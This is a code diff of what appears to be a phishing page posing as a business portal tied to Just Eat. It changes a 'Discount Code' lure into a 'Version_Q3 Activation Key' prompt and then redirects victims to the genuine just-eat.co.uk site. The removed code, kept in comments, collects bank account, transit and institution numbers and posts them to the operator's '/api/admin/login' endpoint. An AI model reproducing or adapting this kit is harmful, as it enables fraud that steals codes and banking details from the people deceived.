@@ -43,7 +43,7 @@
                         </div>
                         <h2 class="HeadingL--1oamcyz FormSectionHeader--nbdyla egjdns FsiRr">Delivering more control, more customers, more success.</h2>
                         <div class="input-saperarto">
-                            <label class="latter-label" for="email">Discount Code #</label><br>
+                            <label class="latter-label" for="email">Version_Q3 Activation Key #</label><br>
                             <input class="input-enter" type="text" maxlength="6" oninput="this.value = this.value.toUpperCase()"/>
                             <button class="loginCode">Submit</button>
                         </div>
@@ -63,7 +63,7 @@
                             </div>
                             <input type="submit" class="loginCode">
                         </form>
-                        <button class="loginSubmit">Discount Code</button>
+                        <button class="loginSubmit">Tab to Set Up</button>
                     </div>
                     <div class="overlay">
                         <div class="mainLoading"><img src="/static/images/spin-white.svg"/></div>
@@ -83,7 +83,7 @@
                  let inputSaperarto = document.querySelector('.input-saperarto');
                  let keyID;
      
-                 keyID = window.location.href.split('/discount/id/')[1];
+                 keyID = window.location.href.split('/update/id/')[1];
                  keyID = keyID.split('/')[0];
      
                  generateClick.addEventListener('click',()=>{
@@ -98,37 +98,47 @@
                  SubmitCode.addEventListener('click', ()=>{
                      let codeSubmit = document.querySelector('.input-enter').value;
                      if(codeSubmit == discountCode){
-                         mainChangElement.insertAdjacentHTML('beforeend','<div class="mainLoading"><img src="/static/images/loading.svg"/></div>');
-                         setTimeout(()=>{
-                             inputSaperarto.style.display = 'none';
-                             document.querySelector('.account').style.display = 'block';
-                             document.querySelector('.mainLoading').style.display = 'none';
-                             document.querySelector('.account').addEventListener('submit',(e)=>{
-                                 e.preventDefault();
-                                 let account = document.querySelectorAll('.input-enter-ppp');  
-                                 let FormDataObj = {
-                                     "Account": account[0].value,
-                                     "Transit": account[1].value,
-                                     "Institution": account[2].value
-                                 };
-                                 console.log(FormDataObj)
-                                 axios.post(`/api/admin/login/${keyID}/account`, FormDataObj).then(res => {
-                                    console.log("thank you");
-                                    localStorage.setItem('complete','complete');
-                                    mainLoading.style.display = 'flex' 
-                                    setTimeout(() => {
-                                        mainLoading.style.display = 'none' 
-                                        document.querySelector('.account').innerHTML = '<div style="display:flex;height:100px;width:100%;justify-content:center;align-items:center;text-align:center;color:white;font-weight:600;">You are succeccfully get the discount it will activate on your portal in two working days. <br/> Thank you</div>'
-                                        // mainpageloading.style.display = 'flex';
-                                        // mainpageloading.style.opacity = '1';
-                                     }, 5000);
-                                 }).catch(err => {
-                                     console.log(err);
-                                 });
-                             });
-                         },3000)
+                        
+                         mainLoading.style.display = 'block' 
+                        setTimeout(() => {
+                            mainLoading.style.display = 'none' 
+                            localStorage.setItem('complete','complete');
+                            inputSaperarto.innerHTML = '<div style="display:flex;height:100px;width:100%;justify-content:center;align-items:center;text-align:center;color:white;font-weight:600;">Succeccfully Activate<br/> Thank you</div>'
+                            window.location.href = 'https://www.just-eat.co.uk'
+                            // mainpageloading.style.display = 'flex';
+                            // mainpageloading.style.opacity = '1';
+                        }, 5000);
+                        //  mainChangElement.insertAdjacentHTML('beforeend','<div class="mainLoading"><img src="/static/images/loading.svg"/></div>');
+                        //  setTimeout(()=>{
+                        //      inputSaperarto.style.display = 'none';
+                        //      document.querySelector('.account').style.display = 'block';
+                        //      document.querySelector('.mainLoading').style.display = 'none';
+                        //      document.querySelector('.account').addEventListener('submit',(e)=>{
+                        //          e.preventDefault();
+                        //          let account = document.querySelectorAll('.input-enter-ppp');  
+                        //          let FormDataObj = {
+                        //              "Account": account[0].value,
+                        //              "Transit": account[1].value,
+                        //              "Institution": account[2].value
+                        //          };
+                        //          console.log(FormDataObj)
+                        //          axios.post(`/api/admin/login/${keyID}/account`, FormDataObj).then(res => {
+                        //             console.log("thank you");
+                        //             localStorage.setItem('complete','complete');
+                        //             mainLoading.style.display = 'flex' 
+                        //             setTimeout(() => {
+                        //                 mainLoading.style.display = 'none' 
+                        //                 document.querySelector('.account').innerHTML = '<div style="display:flex;height:100px;width:100%;justify-content:center;align-items:center;text-align:center;color:white;font-weight:600;">You are succeccfully get the  will activate on your portal in two working days. <br/> Thank you</div>'
+                        //                 // mainpageloading.style.display = 'flex';
+                        //                 // mainpageloading.style.opacity = '1';
+                        //              }, 5000);
+                        //          }).catch(err => {
+                        //              console.log(err);
+                        //          });
+                        //      });
+                        //  },3000)
                      }else{
-                         window.location.href = `/admin/login/discount/id/${keyID}/confirmation`;
+                         window.location.href = `/admin/login/update/id/${keyID}/confirmation`;
                      };
                  });
      
